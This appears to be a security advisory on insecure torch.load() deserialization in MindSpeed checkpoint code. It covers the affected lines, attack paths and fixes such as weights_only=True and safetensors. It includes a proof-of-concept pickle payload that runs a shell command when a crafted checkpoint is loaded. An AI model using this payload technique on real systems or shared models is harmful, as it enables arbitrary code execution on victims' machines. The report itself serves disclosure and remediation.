# VULN-CROSS-TORCH-LOAD-001: Cross-Module Pickle Deserialization Vulnerability

## Summary

**Vulnerability Type:** Deserialization (CWE-502)  
**Severity:** Critical  
**Confidence:** 95% (Confirmed)  
**CVSS Score:** 9.8 (Critical)  

A cross-module insecure deserialization vulnerability exists in MindSpeed's checkpoint loading mechanism. Multiple modules use `torch.load()` without the `weights_only=True` parameter, allowing attackers to execute arbitrary code through malicious pickle payloads embedded in checkpoint files.

---

## Affected Files

| File | Line | Vulnerable Code |
|------|------|-----------------|
| `mindspeed/checkpointing.py` | 277 | `torch.load(checkpoint_name, map_location='cpu')` |
| `mindspeed/checkpointing.py` | 284 | `torch.load(checkpoint_name + ".ema", map_location='cpu')` |
| `mindspeed/checkpointing.py` | 310 | `torch.load(checkpoint_name, map_location='cpu')` |
| `mindspeed/core/distributed/layerzero/state/mga_checkpoint.py` | 188 | `torch.load(sd_file)` |
| `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py` | 55 | `torch.load(self.filename, map_location='cpu')` |
| `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py` | 110 | `torch.load(self.file_list[0], map_location=torch.device('cpu'))` |
| `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py` | 127 | `torch.load(self.mp_rank_files[0], map_location=torch.device('cpu'))` |
| `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py` | 135 | `torch.load(self.mp_rank_files[0], map_location=torch.device('cpu'))` |

---

## Attack Vectors

### Attack Vector 1: Command Line Argument (--load)

**Entry Point:** CLI argument `--load`

**Data Flow:**
```
CLI --load argument
    ↓
args.load (arguments.py)
    ↓
load_dir parameter
    ↓
_load_base_checkpoint(checkpointing.py:204)
    ↓
checkpoint_name = get_checkpoint_name(load_dir, iteration, release)
    ↓
torch.load(checkpoint_name, map_location='cpu')  # VULNERABLE
```

**Vulnerable Function:**
```python
# mindspeed/checkpointing.py:204-277
def _load_base_checkpoint(load_dir, rank0=False, sharded_state_dict=None,
                          exit_on_missing_checkpoint=False, checkpoint_step=None):
    # ...
    checkpoint_name = get_checkpoint_name(load_dir, iteration, release)
    # ...
    state_dict = torch.load(checkpoint_name, map_location='cpu')  # NO weights_only=True
```

### Attack Vector 2: LayerZero YAML Configuration

**Entry Point:** LayerZero config YAML file

**Data Flow:**
```
layerzero_config.yaml (user-controlled file)
    ↓
ckpt_load_path: "/malicious/path"
    ↓
LayerzeroConfig.load_from_yaml() (config.py:73)
    ↓
config.ckpt_load_path
    ↓
load_layerzero_checkpoint(models, config.ckpt_load_path, ...) (config.py:271)
    ↓
sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
    ↓
torch.load(sd_file)  # VULNERABLE
```

**Vulnerable Function:**
```python
# mindspeed/core/distributed/layerzero/state/mga_checkpoint.py:177-188
def load_layerzero_checkpoint(models, ckpt_dir, optimizer=None, opt_param_scheduler=None):
    # ...
    sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
    # ...
    state_dict = torch.load(sd_file)  # NO weights_only=True
```

### Attack Vector 3: LayerZero Checkpointer Tool

**Entry Point:** `ckpt_dir` argument passed to `LayerzeroCheckpoint` class

**Data Flow:**
```
User-provided checkpoint directory
    ↓
LayerzeroCheckpoint(ckpt_dir) (layerzero_checkpointer.py:91)
    ↓
self.file_list = self._get_files_by_key(ckpt_dir, MODEL_FILE_KEY)
    ↓
ShardStateDict(filename) → torch.load(self.filename)  # VULNERABLE
```

---

## Attack Scenarios

### Scenario 1: Malicious Model Distribution

1. Attacker creates a malicious checkpoint file with embedded pickle payload
2. Attacker distributes the checkpoint as a "pre-trained model" on model hub or shares directly
3. Victim downloads and loads the checkpoint using `--load /path/to/malicious/ckpt`
4. Upon loading, the pickle payload executes arbitrary code with victim's privileges

### Scenario 2: Compromised Shared Storage

1. Attacker gains write access to shared storage where checkpoints are stored
2. Attacker modifies checkpoint files by injecting pickle payloads
3. When training job loads the compromised checkpoint, arbitrary code executes
4. This can lead to data exfiltration, lateral movement, or system compromise

### Scenario 3: Supply Chain Attack via LayerZero Config

1. Attacker provides a malicious LayerZero configuration YAML
2. Config specifies `ckpt_load_path` pointing to attacker-controlled location
3. Malicious checkpoint file at that location contains pickle payload
4. Code execution occurs during LayerZero initialization

---

## Proof of Concept Construction

### Step 1: Create Malicious Pickle Payload

```python
import torch
import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # This will execute when the pickle is loaded
        cmd = "touch /tmp/pwned && echo 'VULNERABILITY CONFIRMED' > /tmp/pwned"
        return (os.system, (cmd,))

# Create a fake model state dict with embedded payload
malicious_state_dict = {
    'model': {'weight': torch.randn(10, 10)},
    'iteration': 1000,
    '__payload__': MaliciousPayload()  # Hidden payload
}

# Alternative: Use pickle directly to embed payload more stealthily
import io
payload = pickle.dumps(MaliciousPayload())
# The payload can be embedded in various ways within the checkpoint file
```

### Step 2: Save Malicious Checkpoint

```python
# Save as a valid PyTorch checkpoint
torch.save(malicious_state_dict, 'malicious_checkpoint.pt')
# Or for EMA checkpoint variant
torch.save(malicious_state_dict, 'malicious_checkpoint.pt.ema')
```

### Step 3: Trigger Vulnerability

```bash
# Via CLI argument
python train.py --load /path/to/malicious_checkpoint

# Via LayerZero config
# In layerzero_config.yaml:
# ckpt_load_path: "/path/to/malicious/checkpoint/dir"
python train.py --layerzero-config layerzero_config.yaml
```

### Step 4: Verify Exploitation

```bash
ls -la /tmp/pwned
# If the file exists, the vulnerability was exploited successfully
```

---

## Impact Assessment

### Confidentiality Impact: HIGH
- Attacker can read arbitrary files by executing code
- Can exfiltrate training data, model weights, and credentials
- May access environment variables and secrets

### Integrity Impact: HIGH
- Attacker can modify training data
- Can tamper with model weights to introduce backdoors
- Can corrupt checkpoints and training state

### Availability Impact: HIGH
- Can cause denial of service
- Can corrupt or delete critical files
- Can crash training jobs

### Privileges Required: NONE
- Attacker only needs to provide a malicious checkpoint file
- No special privileges required in the target environment

### User Interaction: REQUIRED
- Victim must load the malicious checkpoint
- This is common practice in ML workflows (transfer learning, fine-tuning)

---

## Root Cause Analysis

1. **Missing Security Parameter:** All `torch.load()` calls lack `weights_only=True`
2. **PyTorch Default Behavior:** By default, `torch.load()` uses pickle for deserialization
3. **No Content Validation:** Code only validates path existence, not checkpoint integrity
4. **Trust Assumption:** Code trusts any file at the specified path

### Comparison with Secure Implementation

The codebase already contains a secure implementation reference:

```python
# mindspeed/mindspore/third_party/transformers/modeling_utils.py:56-60
def load_state_dict(
    checkpoint_file: Union[str, os.PathLike],
    is_quantized: bool = False,
    map_location: Optional[Union[str, torch.device]] = "cpu",
    weights_only: bool = True,  # SECURE DEFAULT
):
```

---

## Remediation Recommendations

### Immediate Fix (Priority: Critical)

Add `weights_only=True` to all `torch.load()` calls:

```python
# BEFORE (Vulnerable)
state_dict = torch.load(checkpoint_name, map_location='cpu')

# AFTER (Secure)
state_dict = torch.load(checkpoint_name, map_location='cpu', weights_only=True)
```

### Affected Files Requiring Patch

1. `mindspeed/checkpointing.py`:
   - Line 277: Add `weights_only=True`
   - Line 284: Add `weights_only=True`
   - Line 310: Add `weights_only=True`

2. `mindspeed/core/distributed/layerzero/state/mga_checkpoint.py`:
   - Line 188: Add `weights_only=True`

3. `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py`:
   - Line 55: Add `weights_only=True`
   - Line 110: Add `weights_only=True`
   - Line 127: Add `weights_only=True`
   - Line 135: Add `weights_only=True`

### Additional Security Measures

1. **Add Checkpoint Validation:**
```python
def validate_checkpoint_path(path):
    """Validate checkpoint path is within allowed directories."""
    allowed_dirs = get_allowed_checkpoint_dirs()
    real_path = os.path.realpath(path)
    if not any(real_path.startswith(d) for d in allowed_dirs):
        raise SecurityError(f"Checkpoint path outside allowed directories: {path}")
```

2. **Add Integrity Verification:**
```python
def load_checkpoint_secure(path, expected_hash=None):
    if expected_hash:
        verify_checkpoint_hash(path, expected_hash)
    return torch.load(path, map_location='cpu', weights_only=True)
```

3. **Use Safetensors Format:**
Consider migrating to safetensors format for model weights, which does not support arbitrary code execution:
```python
from safetensors.torch import load_file
state_dict = load_file(checkpoint_path)  # No arbitrary code execution
```

---

## References

- CWE-502: Deserialization of Untrusted Data
- PyTorch Security Advisory: https://github.com/pytorch/pytorch/blob/main/SECURITY.md
- PyTorch Documentation: https://pytorch.org/docs/stable/generated/torch.load.html
- Safetensors: https://github.com/huggingface/safetensors

---

## Discovery Information

- **Scan Tool:** Static Analysis Security Scanner
- **Detection Pattern:** `torch.load()` without `weights_only` parameter
- **Cross-Module Analysis:** Identified cluster of vulnerable calls across checkpointing and layerzero modules

---

## Verification Steps for Fix

1. Apply the patches adding `weights_only=True`
2. Run existing test suite to verify functionality
3. Attempt to load a checkpoint containing pickle payload
4. Verify that `UnpicklingError` is raised instead of code execution
5. Test with legitimate checkpoints to ensure compatibility
